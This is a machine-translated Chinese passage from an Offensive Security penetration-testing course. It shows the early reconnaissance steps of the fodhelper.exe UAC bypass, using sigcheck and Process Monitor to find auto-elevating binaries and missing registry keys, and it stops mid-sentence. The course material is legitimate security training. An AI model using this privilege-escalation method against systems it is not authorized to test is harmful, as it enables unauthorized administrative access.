<div style="position:absolute;top:120807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理权限。</font><font style="vertical-align: inherit;">我们将尝试查找和修改这些注册表项以运行</font></font></nobr></div>
<div style="position:absolute;top:120827;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高度正直地</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择我们的命令</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:121223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">509 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Winscripting.blog, 2017), https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:121351;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="103"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 103 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:121384;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:122461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:122461;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:122461;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">544</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:121474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.3.1.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:121524;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Registry </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">510</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个分层数据库，用于存储关键的</font></font></i></nobr></div>
<div style="position:absolute;top:121543;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统和选择使用它的应用程序的信息。</font></font></i></nobr></div>
<div style="position:absolute;top:121563;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册表将设置、选项和其他杂项信息存储在一个</font></font></i></nobr></div>
<div style="position:absolute;top:121582;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置单元、键、子键和值的分层树结构。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">511</font></font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将通过运行 C:\Windows\System32\fodhelper.exe 二进制文件开始我们的分析，它</font></font></nobr></div>
<div style="position:absolute;top:121663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理可选功能”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置窗格：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:121945;left:292"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 277：从命令行运行 fodhelper.exe</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了收集有关 fodhelper 完整性级别和权限的详细信息</font></font></nobr></div>
<div style="position:absolute;top:121995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行此过程所需，我们将检查其</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序清单</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">512</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序清单是</font></font></nobr></div>
<div style="position:absolute;top:122015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个 XML 文件，其中包含让操作系统知道如何处理程序的信息</font></font></nobr></div>
<div style="position:absolute;top:122034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当它启动时。</font><font style="vertical-align: inherit;">我们将使用</font><font style="vertical-align: inherit;">Sysinternals</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sigcheck</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序</font><font style="vertical-align: inherit;">检查清单</font><font style="vertical-align: inherit;">，</font><font style="vertical-align: inherit;">通过</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">513</font></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:122054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-a</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，以获得扩展信息和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转储清单。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd C:\Tools\privilege_escalation\SysinternalsSuite</font></font></font></b></nobr></div>
<div style="position:absolute;top:122122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Tools\privilege_escalation\SysinternalsSuite&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sigcheck.exe -a -m C:\Windows\System3</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:122139;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2\fodhelper.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\windows\system32\fodhelper.exe：</font></font></nobr></div>
<div style="position:absolute;top:122190;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已验证：已签名</font></font></nobr></div>
<div style="position:absolute;top:122207;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">签署日期：2017 年 9 月 29 日上午 4:40</font></font></nobr></div>
<div style="position:absolute;top:122224;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发行商：微软视窗</font></font></nobr></div>
<div style="position:absolute;top:122241;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公司：    </font></font></nobr></div>
<div style="position:absolute;top:122241;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软公司</font></font></nobr></div>
<div style="position:absolute;top:122258;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：功能点播助手</font></font></nobr></div>
<div style="position:absolute;top:122275;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">产品：    </font></font></nobr></div>
<div style="position:absolute;top:122275;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软« Windows« 操作系统</font></font></nobr></div>
<div style="position:absolute;top:122292;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">产品版本：10.0.16299.15</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:122351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">510 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry</font></font></font></nobr></div>
<div style="position:absolute;top:122371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">511 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry</font></font></font></nobr></div>
<div style="position:absolute;top:122391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">512 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2019 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/aa374191 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:122411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">513 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/sysinternals/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:122539;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="104"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 104 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:122572;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:123649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:123649;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:123649;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">545</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122668;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件版本：10.0.16299.15 (WinBuild.160101.0800)</font></font></nobr></div>
<div style="position:absolute;top:122684;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器类型：32 位</font></font></nobr></div>
<div style="position:absolute;top:122701;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">二进制版本：10.0.16299.15</font></font></nobr></div>
<div style="position:absolute;top:122718;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原名：FodHelper.EXE</font></font></nobr></div>
<div style="position:absolute;top:122736;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部名称：FodHelper</font></font></nobr></div>
<div style="position:absolute;top:122752;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有：® Microsoft Corporation。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:122769;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论：不适用</font></font></nobr></div>
<div style="position:absolute;top:122786;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">熵：    </font></font></nobr></div>
<div style="position:absolute;top:122786;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.306</font></font></nobr></div>
<div style="position:absolute;top:122803;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显现：</font></font></nobr></div>
<div style="position:absolute;top:122820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</font></font></nobr></div>
<div style="position:absolute;top:122837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;!-- 版权所有 (c) 微软公司 --&gt;</font></font></nobr></div>
<div style="position:absolute;top:122854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;组装</font></font></nobr></div>
<div style="position:absolute;top:122871;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xmlns="urn:schemas-microsoft-com:asm.v1"</font></font></nobr></div>
<div style="position:absolute;top:122888;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"</font></font></nobr></div>
<div style="position:absolute;top:122905;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">manifestVersion="1.0"&gt;</font></font></nobr></div>
<div style="position:absolute;top:122922;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;assemblyIdentity type="win32" publicKeyToken="6595b64144ccf1df" </font></font></nobr></div>
<div style="position:absolute;top:122939;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称="Microsoft.Windows.FodHelper" 版本="5.1.0.0" </font></font></nobr></div>
<div style="position:absolute;top:122956;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理器架构="x86"/&gt;</font></font></nobr></div>
<div style="position:absolute;top:122973;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;description&gt;按需助手 UI 的功能&lt;/description&gt;</font></font></nobr></div>
<div style="position:absolute;top:122990;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"&gt;</font></font></nobr></div>
<div style="position:absolute;top:123007;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;安全&gt;</font></font></nobr></div>
<div style="position:absolute;top:123024;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;请求的权限&gt;</font></font></nobr></div>
<div style="position:absolute;top:123041;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求执行级别</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:123058;left:206"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">级别=“需要管理员”</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:123075;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/&gt;</font></font></nobr></div>
<div style="position:absolute;top:123092;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/requestedPrivileges&gt;</font></font></nobr></div>
<div style="position:absolute;top:123109;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/安全&gt;</font></font></nobr></div>
<div style="position:absolute;top:123126;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/trustInfo&gt;</font></font></nobr></div>
<div style="position:absolute;top:123143;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;asmv3:应用程序&gt;</font></font></nobr></div>
<div style="position:absolute;top:123160;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;asmv3:windowsSettings </font></font></nobr></div>
<div style="position:absolute;top:123177;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings"&gt;</font></font></nobr></div>
<div style="position:absolute;top:123193;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;dpiAware&gt;真&lt;/dpiAware&gt;</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:123210;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;autoElevate&gt;真&lt;/autoElevate&gt;</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:123228;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/asmv3:windowsSettings&gt;</font></font></nobr></div>
<div style="position:absolute;top:123245;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/asmv3:应用程序&gt;</font></font></nobr></div>
<div style="position:absolute;top:123262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/组装&gt;</font></font></nobr></div>
<div style="position:absolute;top:123281;left:220"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 559 - 使用 sigcheck.exe 检查 fodhelper.exe 的应用程序清单</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速查看结果表明该应用程序旨在由管理用户运行</font></font></nobr></div>
<div style="position:absolute;top:123329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此，需要完整的管理员</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">514</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问令牌。</font><font style="vertical-align: inherit;">此外，自动</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提升</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">515</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志是</font></font></nobr></div>
<div style="position:absolute;top:123349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">true</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这允许可执行文件自动提升到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高完整性</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而不提示</font></font></nobr></div>
<div style="position:absolute;top:123368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员用户同意。</font></font></nobr></div>
<div style="position:absolute;top:123401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font><font style="vertical-align: inherit;">Sysinternals 套件中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Process Monitor </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">516</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来收集有关此的更多信息</font></font></nobr></div>
<div style="position:absolute;top:123421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具，因为它执行。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:123559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">514 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2010 年），https://msdn.microsoft.com/en-us/library/bb756929.aspx</font></font></font></nobr></div>
<div style="position:absolute;top:123579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">515 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2016 年），https://technet.microsoft.com/en-us/library/2009.07.uac.aspx</font></font></font></nobr></div>
<div style="position:absolute;top:123599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">516 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:123727;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="105"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 105 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:123760;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:124837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:124837;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:124837;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">546</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:123850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.3.1.2</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:123900;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们的目标是了解如何处理流程时，Process Monitor 是一个非常宝贵的工具</font></font></i></nobr></div>
<div style="position:absolute;top:123919;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定进程与文件系统和 Windows 注册表交互。</font><font style="vertical-align: inherit;">这是一个</font></font></i></nobr></div>
<div style="position:absolute;top:123939;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于识别缺陷的优秀工具，例如注册表劫持、DLL 劫持、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">517</font></font></font></i></nobr></div>
<div style="position:absolute;top:123958;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和更多。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">procmon.exe 后</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们将</font><font style="vertical-align: inherit;">再次</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fodhelper.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并设置过滤器专门关注</font></font></nobr></div>
<div style="position:absolute;top:124039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的目标流程执行的活动。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124380;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 278：按进程名称的 Procmon 过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个过滤器显着减少了输出，但对于这个特定的漏洞，我们只感兴趣</font></font></nobr></div>
<div style="position:absolute;top:124430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此应用程序如何与当前用户可以修改的注册表项进行交互。</font><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:124449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缩小我们的结果，我们将通过搜索“Reg”来调整过滤器，Procmon 用它来标记</font></font></nobr></div>
<div style="position:absolute;top:124469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册表操作。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:124787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">517 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（米特雷，2019 年），https://attack.mitre.org/techniques/T1038/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:124915;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="106"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 106 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:124948;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:126025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:126025;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:126025;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">547</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:125351;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 279：按操作划分的 Procmon 过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加新过滤器后，我们应该只看到注册表操作的结果。</font><font style="vertical-align: inherit;">图 280</font></font></nobr></div>
<div style="position:absolute;top:125402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示进程监视器由于我们的两个过滤器而减少了输出。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:126103;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="107"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 107 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:126136;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:127213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:127213;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:127213;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">548</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126765;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 280：按进程名称和操作结果的 Procmon 过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:126797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些是更易于管理的结果，但我们希望进一步缩小我们的关注范围。</font><font style="vertical-align: inherit;">具体来说，我们想要</font></font></nobr></div>
<div style="position:absolute;top:126816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看 fodhelper 应用程序是否正在尝试访问不存在的注册表项。</font><font style="vertical-align: inherit;">如果这</font></font></nobr></div>
<div style="position:absolute;top:126835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是这种情况，并且这些注册表项的权限允许，我们也许可以篡改那些</font></font></nobr></div>
<div style="position:absolute;top:126855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目并可能干扰目标高完整性流程试图执行的操作</font></font></nobr></div>
<div style="position:absolute;top:126874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">履行。</font></font></nobr></div>
<div style="position:absolute;top:126907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了再次缩小搜索范围，我们将重新运行应用程序并为“NAME NOT”添加“结果”过滤器</font></font></nobr></div>
